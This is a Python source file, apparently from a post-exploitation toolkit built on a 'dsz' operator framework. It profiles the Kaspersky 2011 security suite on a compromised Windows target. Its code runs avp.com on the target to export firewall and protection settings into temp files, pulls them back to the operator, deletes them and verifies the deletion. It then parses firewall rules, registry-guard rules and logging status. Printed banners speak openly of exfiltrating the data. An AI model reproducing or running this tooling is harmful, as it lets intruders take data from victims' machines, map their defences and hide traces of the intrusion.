
import dsz, dsz.lp, dsz.env, dsz.file, shutil, subprocess, re, StringIO, datetime, binascii, shared

def kasVerEleven(kasName, kasDescription, kasVersion, kasRoot):
    if re.match('.*ANTI.*', kasName.upper()):
        shared.safePrint('|   IT APPEARS TO BE ANTI-VIRUS ONLY...  YOU DO NOT NEED ME.')
        shared.safePrint('+---------------------------------------------------------------------------------')
        kasFlavor = 'ANTIVIRUS'
    else:
        kasFlavor = 'SECURITY'
        logDir = dsz.lp.GetLogsDirectory()
        copyCmd = 'cmd /C copy '
        kasXmlFilePtr = open((logDir + '\\kasperskyfile.xml'), 'w')
        shared.safePrint('|   THIS NEW VERSION OF THE KASPERSKY 2011 SCRIPT USES DATA RETRIEVED FROM THE')
        shared.safePrint('|   ACTUAL KASPERSKY PROCESS; IT DOES NOT QUERY THE REGISTRY ANYMORE.')
        shared.safePrint('|   THIS MEANS THAT WE WILL CREATE FOUR FILES ON TARGET, DOWNLOAD THEM, AND DELETE')
        shared.safePrint('|   THEM.  PLEASE ENSURE THAT THE SCRIPT REMOVES THESE FILES CORRECTLY.')
        shared.safePrint('|   GENERALLY SPEAKING, THESE FILES COMBINED ARE TYPICALLY LESS THAN 500K.')
        shared.safePrint('|   IF THERE IS A GOOD REASON NOT TO CREATE AND DOWNLOAD THESE FILES, PLEASE')
        shared.safePrint('|   QUIT OUT OF THIS SCRIPT AND MANUALLY CHECK REGISTRY SETTINGS.')
        shared.safePrint('+---------------------------------------------------------------------------------')
        shared.safePrint('|                        ***** NEW FOR VERSION 2011 ****')
        shared.safePrint('|   KASPERSKY 2011 DOES NOT ALLOW FOR THE SIMPLE EXFIL OF DATA TO A SINGLE FILE.')
        shared.safePrint('|   AS SUCH, WE MUST CREATE 4 FILES ON TARGET (2xTXT 2xDAT), RETRIEVE THEM,')
        shared.safePrint('|   CONCATENATE THEM LOCALLY, AND FINALLY, PARSE THEM.')
        shared.safePrint('|   THIS IS NOT A QUICK PROCESS AND WILL LIKELY TAKE ~5-10 MINUTES.')
        shared.safePrint('|                        ***** PATIENCE IS A VIRTUE *****')
        shared.safePrint('+---------------------------------------------------------------------------------')
        dsz.ui.Pause('DO YOU WISH TO CONTINUE AND CREATE/GET THE KASPERSKY SETTINGS FILES? (REQUIRED TO CONTINUE)')
        (tarWinDir, tarSysDir) = dsz.path.windows.GetSystemPaths()
        tarTempDir = (tarWinDir + '\\temp')
        kasOutFile = ''
        exportType = ''
        dsz.control.echo.Off()
        tempFileName = (logDir + '\\kastemp.txt')
        devNull = ''
        tempCmd = (('local run -command "cmd /C type NUL > ' + tempFileName) + '" -redirect')
        dsz.cmd.Run(tempCmd)
        for i in range(4):
            if (i == 0):
                exportType = 'rtp'
            if (i == 2):
                exportType = 'fw'
            if ((i % 2) == 0):
                kasOutFile = '~klset.txt'
            else:
                kasOutFile = '~klset.dat'
            if dsz.file.Exists(kasOutFile, tarTempDir):
                shared.safePrint('+---------------------------------------------------------------------------------')
                shared.safePrint(('|\t!!!FILE %s\\%s MAY ALREADY EXIST ON TARGET!!!' % (tarTempDir, kasOutFile)))
                shared.safePrint('|\t!!!SEEK HELP IMMEDIATELY!!!   !!!BAILING FROM SCRIPT!!!')
                shared.safePrint('|\t!!!SEE BELOW DIR COMMAND OUTPUT!!!')
                shared.safePrint('+---------------------------------------------------------------------------------')
                dsz.cmd.Run(((('dir ' + tarTempDir) + '\\') + kasOutFile))
                return False
            else:
                shared.safePrint('+---------------------------------------------------------------------------------')
                shared.safePrint(('|   CREATING FILE %d OF 4 ON TARGET....' % (i + 1)))
                if dsz.cmd.Run((((((((('run -command "\\"' + kasRoot) + '\\avp.com\\" export ') + exportType) + ' \\"') + tarTempDir) + '\\') + kasOutFile) + '\\"" -redirect')):
                    shared.safePrint(('|     SUCCESSFULLY CREATED %s\\%s ON TARGET' % (tarTempDir, kasOutFile)))
                    dsz.cmd.Run(((('foreground get ' + tarTempDir) + '\\') + kasOutFile), dsz.RUN_FLAG_RECORD)
                    [getFile] = dsz.cmd.data.Get('filelocalname::localname', dsz.TYPE_STRING)
                if ((i % 2) == 0):
                    tempCmd = (((((('local run -command "cmd /C type ' + logDir) + '\\GetFiles\\') + getFile) + ' >> ') + tempFileName) + '" -redirect')
                    dsz.cmd.Run(tempCmd)
                if dsz.cmd.Run(((('del ' + tarTempDir) + '\\') + kasOutFile)):
                    shared.safePrint(('|     SUCCESSFULLY DELETED %s\\%s ON TARGET' % (tarTempDir, kasOutFile)))
                    if dsz.file.Exists(kasOutFile, tarTempDir):
                        shared.safePrint(('PLEASE CHECK THE STATUS OF THE FILE %s\\%s ON TARGET!!!' % (tarTempDir, kasOutFile)))
                        dsz.ui.Pause(('!!! VERIFY THAT THE FILE %s\\%s IS NOT ON TARGET!!!' % (tarTempDir, kasOutFile)))
                    else:
                        shared.safePrint(('|     VERIFIED DELETION OF FILE %s\\%s FROM TARGET' % (tarTempDir, kasOutFile)))
                        if (dsz.cmd.Run(((('dir ' + tarTempDir) + '\\') + kasOutFile)) == 0):
                            shared.safePrint('|   DIRECTORY LISTING FAILED')
                else:
                    shared.safePrint(('FAILED TO DELETE %s FROM TARGET' % kasOutFile))
                    dsz.ui.Pause(('!!! VERIFY THAT THE FILE %s/%s IS NOT ON TARGET!!!' % (tarTempDir, kasOutFile)))
        shared.safePrint('+---------------------------------------------------------------------------------')
        dsz.ui.Pause('PLEASE CHECK THE ABOVE OUTPUTS TO ENSURE ALL FILES WERE DELETED.')
        try:
            kasXmlFilePtr.write('<kaspersky_settings>\n')
            kasXmlFilePtr.write('<vendor>KASPERSKY</vendor>\n')
            kasXmlFilePtr.write((('<version>' + shared.xmlScrub(kasVersion)) + '</version>\n'))
            kasXmlFilePtr.write((('<description>' + shared.xmlScrub(kasName)) + '</description>\n'))
            kasXmlFilePtr.write((('<root>' + shared.xmlScrub(kasRoot)) + '</root>\n'))
            shared.safePrint(('|  ATTEMPTING TO OPEN FILE: ' + tempFileName))
            kasFilePtr = open(tempFileName)
            swLevel = 0
            fwLevel = 0
            inRegGuard = 0
            fireWallStatus = 'UNKNOWN'
            allPortMonitoring = 'UNKNOWN'
            fileSystemMonitor = 'UNKNOWN'
            logRegEvents = 'UNKNOWN'
            logNonCrit = 'UNKNOWN'
            sysAccountWatch = 'UNKNOWN'
            printFlag = False
            try:
                for line in kasFilePtr:
                    if re.match('.*[+] SW2.*', line):
                        swLevel = 1
                    if (re.match('.*enabled.*', line) and (swLevel == 1)):
                        if re.match('.*yes.*', line):
                            sysAccountWatch = 'ENABLED'
                        elif re.match('.*no.*', line):
                            sysAccountWatch = 'DISABLED'
                        kasXmlFilePtr.write((('<sys_acc_watch>' + shared.xmlScrub(sysAccountWatch)) + '</sys_acc_watch>\n'))
                        swLevel = 0
                    if re.match('.*LogFiles.*', line):
                        fileSystemMonitor = 'ENABLED'
                        if re.match('.*no.*', line):
                            fileSystemMonitor = 'DISABLED'
                        kasXmlFilePtr.write((('<file_sys_logging>' + shared.xmlScrub(fileSystemMonitor)) + '</file_sys_logging>\n'))
                    if re.match('.*LogReg.*', line):
                        logRegEvents = 'ENABLED'
                        if re.match('.*no.*', line):
                            logRegEvents = 'DISABLED'
                        kasXmlFilePtr.write((('<reg_event_logging>' + shared.xmlScrub(logRegEvents)) + '</reg_event_logging>\n'))
                    if re.match('.*FullReport.*', line):
                        logNonCrit = 'ENABLED'
                        if re.match('.*no.*', line):
                            logNonCrit = 'DISABLED'
                        kasXmlFilePtr.write((('<noncrit_event_logging>' + shared.xmlScrub(logNonCrit)) + '</noncrit_event_logging>\n'))
                    if re.match('.*[+].*Firewall.$.*', line):
                        fwLevel = 1
                    if ((1 == fwLevel) and re.match('.*enabled.*', line)):
                        if re.match('.*no.*', line):
                            fireWallStatus = 'DISABLED'
                        else:
                            fireWallStatus = 'ENABLED'
                        kasXmlFilePtr.write((('<firewall_status>' + shared.xmlScrub(fireWallStatus)) + '</firewall_status>\n'))
                        fwLevel = 0
                    if re.match('.*AllPorts.*', line):
                        if re.match('.*yes.*', line):
                            allPortMonitoring = 'ENABLED'
                        else:
                            allPortMonitoring = 'DISABLED'
                    if re.match('.*vRuleList_vcontent.*', line):
                        splitFw = line.split(' ')
                        fwActionBlock = splitFw[2]
                    m = re.match('.*?([0-9a-fA-F]{4}07268930.*0801816089).*?', line)
                    if m:
                        fwRules = m.group(1)
                        shared.lateKasFw(fwRules, kasXmlFilePtr, fwActionBlock)
                    if re.match('.*[+].*Resource.$.*', line):
                        inRegGuard = 1
                    if (re.match('.*Childs_vcontent.*', line) and (inRegGuard == 1)):
                        shared.lateKasRegRules(line, kasXmlFilePtr)
                        inRegGuard = 0
                    if re.match('.*4b4c41707054727573746564.*', line):
                        shared.lateKasAppRules(line, kasXmlFilePtr)
                regGetGmd = ''
                regGetCmd = 'registryquery -hive l -key SOFTWARE\\KasperskyLab\\protected\\AVP11\\profiles\\TrafficMonitor\\settings\\ -value Ports_vcontent'
                dsz.cmd.Run(regGetCmd, dsz.RUN_FLAG_RECORD)
                [regValue] = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING)
                shared.lateKasPortMon(regValue, kasXmlFilePtr)
                kasXmlFilePtr.write((('<allport_monitoring>' + allPortMonitoring) + '</allport_monitoring>'))
                shared.safePrint('+----------------------------------------------------------------------------------+')
                shared.safePrint('| GENERAL PSP STATUS:                                                              |')
                shared.safePrint('+----------------------------------------------------------------------------------+')
                shared.safePrint(('|      FIREWALL IS:                       %s' % fireWallStatus))
                shared.safePrint(('|      PORT MONITORING ON ALL PORTS IS:   %s' % allPortMonitoring))
                shared.safePrint(('|      FILE SYSTEM MONITORING:            %s' % fileSystemMonitor))
                shared.safePrint(('|      SYSTEM ACCOUNT WATCHING IS:        %s' % sysAccountWatch))
                shared.safePrint(('|      NON-CRITICAL EVENT LOGGING IS:     %s' % logNonCrit))
                shared.safePrint(('|      LOGGING OF REGISTRY EVENTS IS:     %s' % logRegEvents))
                shared.safePrint('+----------------------------------------------------------------------------------+')
            finally:
                kasFilePtr.close()
        finally:
            kasXmlFilePtr.write('</kaspersky_settings>\n')
            kasXmlFilePtr.close()
    return True